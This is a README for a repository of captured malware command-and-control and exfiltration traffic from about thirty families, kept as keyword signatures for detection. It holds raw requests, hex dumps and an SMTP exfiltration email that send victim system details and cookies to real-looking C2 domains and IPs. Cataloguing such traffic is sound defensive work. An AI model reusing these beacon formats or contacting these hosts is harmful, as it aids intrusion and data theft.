### A repo for matching on known c2 and exfil traffic keywords (ctrl+f to search)

#### AgentTesla http:
~~~
POST /zin/WebPanel/api.php HTTP/1.1
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)
Content-Type: application/x-www-form-urlencoded
Host: megaplast.co.rs
Content-Length: 308
Expect: 100-continue
Connection: Keep-Alive

HTTP/1.1 100 Continue

p=G1DZYwdIiDZ6V83seaZCmTT0wiCyOlXVS0OEx4YpkUAOuKO/6hfQJ%2BZD2LjpTbyu9w0gudjYXCIc0Ul74wtsvtqYLYuTR%2BlFVl%2B5deG0RnTTo6nFc1M9tx0%2BRo7WXetRdIHkmVMMSeqH%2BEroM7yttDzosvKfKgB%2BJ07oqT/YvQ6CPNW2%2BCETCU6oIlO9XYyrEy6/hYeF%2BgkfRc9xSEfZhh/7Wk0khJ4zZJ3cjEvXDxJcQWA739/yDUy4kOAndihYsWnLw1mVCHxJSJf7%2BguB9f4DpgX10NLpH
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/agenttesla-http.png "AgentTesla HTTP")

#### AgentTesla smtp exil:
~~~
From: office@larbaxpo[.]com
To: officelogs@larbaxpo[.]com
Date: 9 Oct 2019 17:58:19 +0100
Subject: admin/USER-PC Recovered Cookies
Content-Type: multipart/mixed;
 boundary=--boundary_0_cac7ba32-e0f8-42d4-8b2e-71d1828e6ff7

----boundary_0_cac7ba32-e0f8-42d4-8b2e-71d1828e6ff7
Content-Type: text/html; charset=us-ascii
Content-Transfer-Encoding: quoted-printable

Time: 10/09/2019 17:58:13<br>UserName: admin<br>ComputerName: USE=
R-PC<br>OSFullName: Microsoft Windows 7 Professional <br>CPU: Int=
el(R) Core(TM) i5-6400 CPU @ 2.70GHz<br>RAM: 3583.61 MB<br>IP: 18=
5.183.107.236=0A<hr>
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/agenttesla-submission.png "AgentTesla Submission")

#### Amadey
~~~
POST /madapam/index.php HTTP/1.1
Host: bolsaooma.com
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 77

id=6289217249&sd=MMMMMM&vs=1.43&ar=0&bi=0&lv=0&os=9&av=0&pc=USER-PC&un=admin&

HTTP/1.1 200 OK
Server: nginx
Date: Wed, 09 Oct 2019 06:20:09 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 6
Connection: close

<c><d>
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/amadey.png "Amadey")

#### Arechclient2
~~~
....+.{"Type":"EncryptionStatus","Status":"Off"}....&.{"Type":"ConnectionType","ConnectionType":"Client","SessionID":"191003337","BotName":"admin","BotOS":"Microsoft Windows 7 Professional "}....-.{"Type":"SessionID","SessionID":"191003337"}......{"Type":"AfkSystem"}....).{"Type":"ServerAfkSystem","Status":"ok"}
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/arechclient2.png "Arechclient2")

#### Artraloader
~~~
POST /kvs06v.php HTTP/1.0
Host: onlinejohnline99.org
Connection: keep-alive
Content-type: application/x-www-form-urlencoded
Content-length: 97

SNI=VTFS.QD&UME=Xjoepxt!8!Qspgfttjpobm&OPQ=benjo&IVR=VTFS.QD$$benjoAA11482.572.3314613.96675&st=0

HTTP/1.0 200 OK
Content-Type: text/html
Content-Length: 0
Date: Mon, 26 Aug 2019 21:33:28 GMT
Server: LiteSpeed
Connection: close

POST /Engset.php HTTP/1.0
Host: hewle.kielsoservice.net
Connection: keep-alive
Content-type: application/x-www-form-urlencoded
Content-length: 126

BCDEF=EFTLUPQ.KHMMKME&MNOPQ=Xjoepxt!21!Qsp&GHIJ=benjo&UVWXYZ=EFTLUPQ.KHMMKME$$benjoAAcc:37f65.f4db.51ge.bf:1.3875452f88:3&st=0
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/artra.png "Artraloader")

#### Avemaria, aka ave_maria, warzone rat
~~~
    00000000  09 12 3b 42 2d 33 a2 44  fc 01 86 73               ..;B-3.D ...s
00000000  09 12 3b 42 f7 33 a2 44  fd 01 86 73 69 3d ae 12   ..;B.3.D ...si=..
00000010  bb c6 19 fd 1a 3a f3 11  c9 ae da 3c 30 bc 38 81   .....:.. ...<0.8.
00000020  fc 00 0f ca 4e fb 05 c6  de b7 3c 6f 4e 01 a2 87   ....N... ..<oN...
00000030  82 f5 2f 8e ed 2a 1f 0e  b7 43 0c a0 34 5d bd 80   ../..*.. .C..4]..
00000040  50 56 66 1a 11 af f5 c8  a3 16 b0 d4 38 12 fe 66   PVf..... ....8..f
00000050  6b 84 c4 4b 58 f4 d3 ce  87 45 75 54 60 f0 d5 3e   k..KX... .EuT`..>
00000060  f1 79 73 5d 9f 1c c4 8e  1a c5 16 20 71 5e 55 06   .ys].... ... q^U.
00000070  21 7b 8d 35 de 00 25 5d  6f d7 f2 ca a3 ea ef 73   !{.5..%] o......s
00000080  90 1f 6e 10 d3 b1 0a 56  17 71 3b 48 bd 5c d9 36   ..n....V .q;H.\.6
00000090  7e b4 f1 76 46 b8 48 ca  45 1e cd 66 90 d5 67 6b   ~..vF.H. E..f..gk
000000A0  aa b7 98 ed 9d df 7e 36  c0 78 87 6b 56 03 86 67   ......~6 .x.kV..g
000000B0  1f ed bb 9e e6 78 aa d5  94 e3 0e e2 c0 5e c7 87   .....x.. .....^..
000000C0  57 60 34 e4 06 ea 10 ae  6e 38 c3 ca af 01 e2 2c   W`4..... n8.....,
000000D0  ea d4 26 f9 3a 05 83 f7  aa 59 db 01 f5 2b 40 1e   ..&.:... .Y...+@.
000000E0  74 28 36 1f ac 03                                  t(6...
    0000000C  09 12 3b 42 2d 33 a2 44  dc 01 86 73               ..;B-3.D ...s
000000E6  09 12 3b 42 29 33 a2 44  eb 01 86 73 bc 8d c4 e7   ..;B)3.D ...s....
    00000018  09 12 3b 42 5d d9 a2 44  e2 01 86 73 bc 8d c4 e7   ..;B]..D ...s....
    00000028  ca 69 41 01 ab 12 30 ff  ae 64 2d 93 dc 65 53 9b   .iA...0. .d-..eS.
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/avemaria.png "Avemaria")

#### Azorult
POST retrieve metod, unique pattern with lot's of '/' and ')'
~~~
POST /index.php HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1)
Host: 51.38.76.57
Content-Length: 103
Cache-Control: no-cache

J/.8/.:/.</.?/.>O.(8.I/.>/.9/.>K.>8.N/.I/.;/.</.;N.>:.NL.?N.>8.(9.L/.8/.</.4/.4/.I/.?/.>H.(9.(9.(9.(9.I
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/azorult.png "Azorult")

#### Bandook RAT
~~~
00000000  64 4f 7a 54 30 46 72 56  44 51 4c 30 6f 32 49 48   dOzT0FrV DQL0o2IH
00000010  6f 70 46 6c 31 69 37 48  4c 35 48 48 54 4f 6e 66   opFl1i7H L5HHTOnf
00000020  6f 30 55 72 6a 47 7a 48  30 61 30 4f 62 54 37 69   o0UrjGzH 0a0ObT7i
00000030  45 42 64 2b 54 4e 6a 4f  72 77 74 44 6d 4c 57 52   EBd+TNjO rwtDmLWR
00000040  59 54 68 6f 36 6b 4c 2f  42 38 33 43 4d 75 49 2b   YTho6kL/ B83CMuI+
00000050  6e 34 46 5a 55 66 49 4a  2f 70 6e 31 32 6a 62 73   n4FZUfIJ /pn12jbs
00000060  4c 2f 4c 79 54 73 42 73  76 63 48 66 6e 6b 4a 53   L/LyTsBs vcHfnkJS
00000070  5a 6a 6b 4b 59 34 2b 54  4b 48 44 76 6c 54 32 52   ZjkKY4+T KHDvlT2R
00000080  59 57 69 59 4a 70 54 48  6d 70 68 4f 70 51 4d 47   YWiYJpTH mphOpQMG
00000090  6d 77 3d 3d 26 26 26                               mw==&&&
    00000000  64 4f 7a 54 30 46 6f 3d                            dOzT0Fo= 
00000097  64 4f 7a 54 30 46 76 56  44 51 3d 3d 26 26 26      dOzT0FvV DQ==&&&
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/bandook.png "Bandook")

#### Betabot
~~~
POST /forum3/logout.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Host: russk9.icu
Content-Length: 664
Cache-Control: no-cache

bcjkr=386731&dgpsben=2019162b8cf358952f71fa238d6ecbcd6c424d692427445f&fkvalqbgr=C27431FCDE2C51BA6EA493FEAB76CE9BE2812C592CBADEEC4495BC94DDE1882E969102B5A9939B43816D8DA17AC2C05A575A4FC03B11D0C9614BE38ABB6B7F57984A1EC6D101BF290C06DC4C3093B6B165ACAEF8C9EFE3099C11D2106C16EFFD27888EB24A03E0CDE4935AAB53FD212683FF45CAE1BF47F2C343D602E10C79E49B74E6FE10469501A63C762A089446AC9A1C5A802C80071E11058065B5C481D0DB2E6B0AC9A7461DE3DA4792CC86A6E072080ACCB527BB0D97D7C91874B8754068C71AD56502B1A03279A280EF9E705E25193C82A93B220B4B1A63FD8B93EF2B528AF5EB5A00E4234CF1744FA96A05937E7B41D4B82B3997203F0ABCBFC2C49245E56DED2DF1941DA739C6F9C7C3E30C93A136705F3574F34C74E6DE2AD09C9BFA616F4C

HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Mon, 28 Oct 2019 23:47:58 GMT
Content-Type: text/html
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/5.5.38

..._...+...<.f........}..........?...yg.4.....#.Q...p...1yy.u..N?.ueg.v....EO......K.:....R.]......zv...3@j..
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/betabot.png "Betabot")

#### Bitter RAT (Patchwork)
~~~
GET /ourtyaz/qwe.php?TIe=%3a116%3ad48.2431.52b5.c69e.3c86b%3a961e3g*Vtfs.QD*%3aACme%3b%217%2f2%2f8712%21Tfswjdf%21Qbdl%212 HTTP/1.1
Host: frameworksupport.net
Connection: close

HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Content-Length: 74
Date: Sat, 12 Jan 2019 02:44:27 GMT
Accept-Ranges: bytes
Server: LiteSpeed
Connection: close

90059c37-1320-41a4-b58d-2b75a9850d2f 78.109.23.2 User-PC EXE: ##
SIZE: ##

AXE: ##
SIZE: #45#SRE: ##
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/bitter.png "Bitter RAT")

#### Bladabindi aka nJrat
~~~
147.ll1990MURFTUFZT19DNEJBMzY0Nw==1990USER-PC1990admin199018-03-2619901990Win 7 Professional SP1 x861990No1990N/A1990..1990UHJvZ3JhbSBNYW5hZ2VyAA==1990123.inf1990MURFTUFZTw0KMWRlbWF5by5kdWNrZG5zLm9yZzoxOTkwDQp2NC4wLjMwMzE5DQpSZWdTdmNzLmV4ZQ0KRmFsc2UNCkZhbHNlDQpGYWxzZQ0KRmFsc2U=15.CAP199035199023926.CAP1990......JFIF.....`.`.....C...........		.
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/njrat.png "Bladabindi - nJrat")

#### Blackrat aka blackremote
~~~
9.............................>Clientx, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null......ProClient.Data.....data.bytes.............102622021F20414A5644044411072A755821285E472B1826013113651A28101927225D5B1037185F69394B2911291A1A3F031C113F696C1442754978280A031673281879480C2843582C0B032E41737D7E5B5C7A0F7C0D7521
...............................>Clientx, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null......ProClient.Data.....data.bytes..........."1A3A0F03142D5055131F585605383F4051

...............................J2085182040988060201, Version=1.0.7.0, Culture=neutral, PublicKeyToken=null.....
BlackRAT.Data.....data.bytes...........(102622021F20415F0818765B27312642512C3103
...............................J2085182040988060201, Version=1.0.7.0, Culture=neutral, PublicKeyToken=null.....
BlackRAT.Data.....data.bytes............123C3803363F73570B0552
..$............................J2085182040988060201, Version=1.0.7.0, Culture=neutral, PublicKeyToken=null.....
BlackRAT.Data.....data.bytes.............16310D190E2C4918020E52	..........$...MZ......................@.............................................	.!..L.!This program cannot be run in DOS mode.
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/blackrat.png "Blackrat")

#### Cobaltstrike
~~~
GET /Mdt7 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; NP06)
Host: 198.199.89.56
Connection: Keep-Alive
Cache-Control: no-cache

HTTP/1.1 200 OK
Date: Wed, 16 Oct 2019 00:03:32 GMT
Content-Type: application/octet-stream
Content-Length: 213589

.......
w.z....=..........C.D.'.'Z.2....:1....R..1...1.......1.9.t...^.......3.Q.3.R.~...~..........6a..6a-L^.............................................`.....W...?...O...=...^...1...T...:.......:..._...U...U...U.v.......v......,9
.W.E.3k..a....9..l.T..k...........J......;J.._.k...$......J....h...'..qD

GET /push HTTP/1.1
Accept: */*
Cookie: TwJl1o2Nzk3+xmC39FsNTbyJPGHyNxllFZ8wZUwR831SYmTwrxoGydXQGF1ej89K1t0rTLgzjd95c8127hlZ6SQ4hx95YrYuRHooitXYGEAxtbKv53LJ6K+6r1y1OQU3n0+O93xxPiyx6RvPeKzlACbO4nEc5YKzh0vAfWJvlm0=
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;ENXA)
Host: 198.199.89.56
Connection: Keep-Alive
Cache-Control: no-cache

HTTP/1.1 200 OK
Date: Wed, 16 Oct 2019 00:05:35 GMT
Content-Type: application/octet-stream
Content-Length: 0
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/cobaltstrike.png "Cobaltstrike")

#### Danabot
Not real TLS traffic, flag on "24 01 00 00" pattern and 24 byte first packet 
~~~
00000000  24 01 00 00 00 00 00 00 e5 7c 00 00 00 00 00 00    $....... .|......
00000010  09 7e 00 00 00 00 00 00                            .~...... 
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/danabot.png "Danabot")

#### Darkcomet
~~~
BF7CAB464EFBA57DAD495BECB15D8B4C57F0BE821AEF052DF1C27F08DDFC328EB3FE9F5699707BCDC8C751A55F2CE98F3201C7FC248AA8FC340C2F20D8436FEDEAF457052D53A8F4BFF6568F5D644E03BDB309B022A095BBC95AECE9ACB25EFD2BA04271017BADF1C0D75325C58BB1A8E3C42814BA1D830DF380472AFFBC7F034344A76764BFCC2DC473B6836F4CF2D8518E9CA4A32A3C5FA402FA2837A9BEE006127A5E073F925EC3F95F680D25EB86F58C423E5C645340002B677EA40FE1648BAE9D11EA4BC915D6E53CEF98429542C22BD7439A33FFE8B48BE44AD038C62AA82985A15A0F7F9E342D9F81EB0DB396D2589D80F51FEE9B296FCCE117FCCC25EB8445EFE7617E0930C3FC1931227EC1E2AC401B18E0AE61924E7402CFBB418711F39C890EB6AAD843903AE1D39A0DF31AFFDECA82F3FA48EB19D122088C809D5CEA3F4C59E8C8D57AB04B3DFDE3DD47B37878AD856643B46CAD5A4DEBC3E677BA446EBAD350549BB36FC8FAAE784C7C1EC91932AEB6A3014F3C11FDB9EBA711B7517E0C4EEFA15FF93BDBE8D0E716D8C7E5F3
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/darkcomet.png "Darkcomet")

#### Darkrat
~~~
POST /request HTTP/1.1
Accept: text/plain
Content-Type: application/x-www-form-urlencoded
User-Agent: agent
Host: 104.244.75.179
Content-Length: 640

request=YUhkcFpEMDVNREExT1dNek55MHhNekl3TFRReFlUUXRZalU0WkMweVlqYzFZVGs0TlRCa01tWW1ZMjl0Y0hWMFpYSnVZVzFsUFZWVFJWSXRVRU1tWVc5eWJtOTBQV1poYkhObEptbHVjM1JoYkd4bFpGSmhiVDB6TGpRNU9UWXhPU1p1WlhSR2NtRnRaWGR2Y21zeVBYUnlkV1VtYm1WMFJuSmhiV1YzYjNKck16MTBjblZsSm01bGRFWnlZVzFsZDI5eWF6TTFQWFJ5ZFdVbWJtVjBSbkpoYldWM2IzSnJORDEwY25WbEptRnVkR2wyYVhKMWN6MG1ZbTkwZG1WeWMybHZiajB5TGpJdU1DWm5jSFZPWVcxbFBXUkhPV3RpZHowOUptTndkVTVoYldVOVUxYzFNRnBYZDI5VmFXdG5VVEk1ZVZwVGFGVlVVMnRuWVZSVmRFNXFVWGROUTBKRVZVWlZaMUZEUVhsTWFtTjNVakJvTmlaaGNtTm9QV1ZFWnpJbWIzQmxjbWx1WjNONWMzUmxiVDFXTW14MVdrYzVNMk41UVROSlJrNXNZMjVhY0ZreVZXZFZSMFpxWVhsQmVDWnpjSEpsWVdSMFlXYzljR0ZzYVhkaA==

HTTP/1.1 200 OK
Date: Tue, 08 Oct 2019 11:25:25 GMT
Server: Apache/2.4.25 (Debian)
Set-Cookie: PHPSESSID=hikrbr50pt7ggjr4rcbg40bvl6; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 0
Content-Type: text/html; charset=UTF-8
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/darkrat.png "Darkrat")

#### DCRat
~~~
GET /ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54/46kqbjvyklunp1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/56743785cf97084d3a49a8bf0956f2c744a4a3e0.php?data=active

HTTP/1.1
Host: domalo.online
Connection: Keep-Alive

GET /ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54/46kqbjvyklunp1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/akcii239myzon0xwjlxqnn3b34w/212bad81b4208a2b412dfca05f1d9fa7.php?type=__ds_setdata&__ds_setdata_user=552b13e67562d7b564b8a0ac9f35c735d17c786b&__ds_setdata_ext=2dce65292845e5dbc41d772bf7f1866e&__ds_setdata_data=%3CSTR%3Esmss.exe%3CSTR%3Esvchost.exe%3CSTR%3Ewinlogon.exe%3CSTR%3Esvchost.exe%3CSTR%3Esvchost.exe%3CSTR%3Ecsrss.exe%3CSTR%3Esvchost.exe%3CSTR%3Elsm.exe%3CSTR%3Eqemu-ga.exe%3CSTR%3Esvchost.exe%3CSTR%3Esvchost.exe%3CSTR%3Esvchost.exe%3CSTR%3Eexplorer.exe%3CSTR%3ESearchProtocolHost.exe%3CSTR%3Elsass.exe%3CSTR%3Ectfmon.exe%3CSTR%3Edwm.exe%3CSTR%3Ecsrss.exe%3CSTR%3Esvchost.exe%3CSTR%3Eservices.exe%3CSTR%3EWmiPrvSE.exe%3CSTR%3Ewininit.exe%3CSTR%3Espoolsv.exe%3CSTR%3Efsdffc.exe%3CSTR%3ESearchIndexer.exe%3CSTR%3ESearchFilterHost.exe%3CSTR%3Ewindanr.exe%3CSTR%3Esvchost.exe%3CSTR%3Esvchost.exe%3CSTR%3Etaskeng.exe%3CSTR%3ESystem.exe%3CSTR%3Esvchost.exe%3CSTR%3EIdle.exe 

HTTP/1.1
Host: domalo.online
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/dcrat.png "DCRat")

#### Delf Loader
~~~
GET /gate.php?serial=MTc4NS02NDU5LTQ2NDktMjQ0NA== HTTP/1.1
Content-Type: text/html
User-Agent: License
Host: ddhook.000webhostapp.com
Cache-Control: no-cache

HTTP/1.1 200 OK
Date: Mon, 07 Oct 2019 10:36:45 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Server: awex
X-Xss-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Request-ID: db10cf7bfe6a5d2a490182a808ccb458

11d091d035fb3bd27625c54c622a7e48


GET /check.php?serial=MTc4NS02NDU5LTQ2NDktMjQ0NA== HTTP/1.1
Content-Type: text/html
User-Agent: License
Host: ddhook.000webhostapp.com
Cache-Control: no-cache

HTTP/1.1 200 OK
Date: Mon, 07 Oct 2019 10:36:45 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Server: awex
X-Xss-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Request-ID: 4f25a2a515ae727693adbe820cf36edd

bff12793b8731a7f138e454a576ed1b5
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/delf.png "Delf Loader")

#### Donotgroup
~~~
POST /ze/volad/uzi HTTP/1.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3)
Host: skillsnew.top
Content-Length: 1265
Cache-Control: no-cache

data=oowJkdfLibIHB1Y62ffb2Cf5imwjN2x/vp1AE/SF8E9/fX1cnZaC6Bg7jRETqi6iAsAVATepyhSETB+r2H2rYWEvvx/SmugiXvz27uz0yReYJAkt5CqsQ1ydb5UHNRcWeCnGPQpjtxUSdy2LbDj+BHjBdjchVAB23Cz4rjuoSeMKlJRQ9zvCOr97/MMALs/TboDUd+5fj/i2/APrZTfpizOy8v+poMBVcVMSRXHmpqpemivoTJEMmTx7y5tGBeY2YbMpVycCDNMyaJr7Xuh3Bng2MVZ5/OO2jvfqFXqwiMMZtiBEpRGjCKGYsUb/J2cyOMtemC3Sh71GkfSpI1sSV+1rKJzBILo6VHTGPK0Z12dxKVXEUCn4KTUTo/QVWTCnCyL7r+b0BIL+SVXjBOGtamQqja1Hq0Hrihoulr6qYy0jDKiyDa9n9BkSO3AJXsx5IkMf0qQvKzMW3iWvcRmILL1AXRCGgsxFCvAcDZ9GV5jM7E6rXEYQcYATyePeWJIMnNO6Tvyn/4qcywkEiKwt8Uoe6YCGaEwZjIsWfhFHTyJXj4KUY7nUuArbF1iz029U2QErLL5AiQUpHYeddGkjkvEPRnwahESDpYAwS6dVEKCn/n4CMJHEJqxHNRA2uSEewoCBYQb1lsKfdiMFZvD1kzKaxR7Oeluch5UFAGEhbJQMC6PsyVQ1nna6bn2S/0Bc4tKsMXfkr3YdfrPrXjUu4PlMRYPQYFUKTTpsFyAHXQ4a5jaiW9PmZOx1Iej9I0aFIiF8e1nVYgNXmMO3pYYbKxW0sn/MswbPNeNs3vQVFma15AM3y7eK8sPPizvYTsG6ld8rW0aUNqidEfpvck50hpUDKH0RdcfT9u+Kw5NZJ99ebBO8DMc1q4/8l9Tb887feKC1bvRVS2JYZKSyDaLJtC7VYZLjtczdqtu5Ayrh3q8kvWFxneIVI9jBuYi5YSkH+F7YQ/yuiDZwtGw6USUejEOuIpfa0PSIJQkDf01AqeKrXcNtKnmjv51Kmu1Go5u0v/zPgWDNG6w3DH0UhWrZxodJwLuKx6Qu66p3Vww/XJcQwVIK+86StKqMcCBH44nE11jRVZNi8L5Ru6WWvVqtktYlOJAJq9T/0Y3O7Onac3fDTThRSkme8mpvzCbkVhTW3jG9h+8aKt2H5rpgrb+4oSfCZQh+V+zDE54I2ODNytc79YOHTdrxYgEG3K2wS4udvyG6t66FA8RUJqmMc+ZPSGk9ZDH0hKpA5iWAr06IGlo=
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/donotgroup.png "Donotgroup")

#### Dunihi
~~~
POST /is-ready HTTP/1.1
Accept: */*
Accept-Language: en-us
User-Agent: C4BA3647<|>USER-PC<|>admin<|>Microsoft Windows 7 Professional <|>+<|>undefined<|>false - 20/9/2019
Accept-Encoding: gzip, deflate
Host: 192.186.145.93:8885
Content-Length: 0
Connection: Keep-Alive
Cache-Control: no-cache

HTTP/1.1 200 OK
Connection: close
Content-Type: text/html
Server: Indy/9.0.18
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/dunihi.png "Dunihi")

#### Emotet
~~~
POST /mult/tlb/ HTTP/1.1
Referer: http://69.162.169.173/mult/tlb/
Content-Type: application/x-www-form-urlencoded
DNT: 1
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Host: 69.162.169.173:8080
Content-Length: 468
Connection: Keep-Alive
Cache-Control: no-cache

5Grps=L1sIwg4a7XWGwPpN9LOBzMiBXsZTP33ixo%2FUspmgBLoaYr0K7KnwvoUER9%2B5NzIxpTHgpSTeVRZMm92wSA%2Ff9pG66uhR%2FX%2BGREn%2BVIvlr3LiYQupDVsdexmgD%2FSXdTJ%2FxXNSo5Q52S4HvI9eLtM9s0arCw%2FNNEZlkzp6e8omxU3854YNNNUcAV54N30rgISrXlxvWJz9TP%2FelEcMxMf3hzv91K1Uz8H2KWzWjV2x78pmAG9HGdkFGLaOq6Tqp1LH6Uc7c1gzmZ3Cht2T4cKg06DPDTHkXYj%2F7uCMWAFMO%2FS4QlZl1XKi8MmZck0JAmxsZdGcmIkQoqq5DzFCio6fUAgvqUN3g1%2BP5eXYeZpGu1xIzbWLRG9Wtt2vUOjz4ezl6Z%2B2peN1LKWN%2F8V0CLjxQHhXSu9YZP4g3NIdJ5qofLmM0ipT

HTTP/1.1 200 OK
Server: nginx
Date: Mon, 07 Oct 2019 13:38:33 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 148
Connection: keep-alive

.^ta.I..Z .._AJ*..=._...5-...F.L{>...`.c.....~.|.h...@.E...2.Z|U..W..M....b......X.FA....x.....\.j?/C......{pi.b....Cz......>D..yQ........G.q...4?..
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/emotet-1.png "Emotet")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/emotet-2.png "Emotet")

#### Evilpony
Follow tcp stream, not http stream in wireshark
~~~
POST /d2/about.php HTTP/1.0
Host: spausence.com
Accept-Encoding: identity, *;q=0
Accept-Language: en-US
Content-Length: 337
Content-Type: application/octet-stream
Connection: close
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Content-Encoding: binary

...Q..8.T.f5...~....I..%..`qq...q.^.i.u..v.|34.../t....w....u.}........
6.......
...2..T(.Z.X/..A....55.....>$l
..uE.-..p..
..omvs.S.uYa.Y...............Ezv...B.OM_.X.pg..1...6..}kN..U..%...2.:.H.E......9.k.-.5sD..@.*
	k~........y.s.....@.L+X....wK.O11a.q.$.zd.A...hd9........,. ..(..tP..$.|rS....I.8"
..X!@.	....4N...x.<.......!m~O_.T`.HTTP/1.1 200 OK
Server: nginx/1.10.3
Date: Thu, 03 Oct 2019 17:18:05 GMT
Content-Type: text/html
Connection: close
X-Powered-By: PHP/5.4.45

I6.$...Z,....   
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/evilpony.png "Evilpony")

#### Exilerat
~~~
POST /test/u HTTP/1.1
Cache-Control: no-store
Connection: Keep-Alive
Pragma: no-store
Content-Type: multipart/form-data; boundary=--71h2ll4i66hhbl
Accept: text/*,application/*
Accept-Language: en-US,en
Host: 27.126.188.212
Content-Length: 368

--71h2ll4i66hhbl
Content-Disposition:form-data;name="x.bin"
Content-Type:application/octect-stream

cjESYTqBEdGqEeIxETEREaKiooqikgm6irKKgqKigimigikRMysrKz8jIyMrqhHi
MRExERGioqKKopIJuoqyioKiooIpooIpETMbIyMjibkJsUqhOTsLIyMjKABIaFAD
GyMjI6JSolKiUqIL2yMjI4qySoqCSqKiSoIpSqKCSikRquqyUqqS4lKqoqJS4qob
kyMjI5loUABYmLgimiKQCLDyklKqUpqSoqpjBAMjIw==
--71h2ll4i66hhbl--
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/exilerat.png "Exilerat")

#### Expiro
~~~
POST dovamnabihede.ws HTTP/1.1
User-Agent: Mozilla/4.0 (Compatible; msie 44; NT6.1.7601-90376708.ENU.3DA43F52-83C788-FF5FFC-15DD1711; .NET CLR 00000000/00000000)
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/expiro.png "Expiro")

#### Filecoder.STOP
~~~
GET /As73yhsyU34578hxxx/SDf565g/get.php?pid=2485E9F082250E269EA0EF635E0D382D&first=true HTTP/1.1
User-Agent: Microsoft Internet Explorer
Host: ring1.ug

HTTP/1.1 200 OK
Date: Fri, 25 Oct 2019 13:26:11 GMT
Server: Apache/2.4.37 (Win64) PHP/5.6.40
X-Powered-By: PHP/5.6.40
Content-Length: 562
Connection: close
Content-Type: text/html; charset=UTF-8

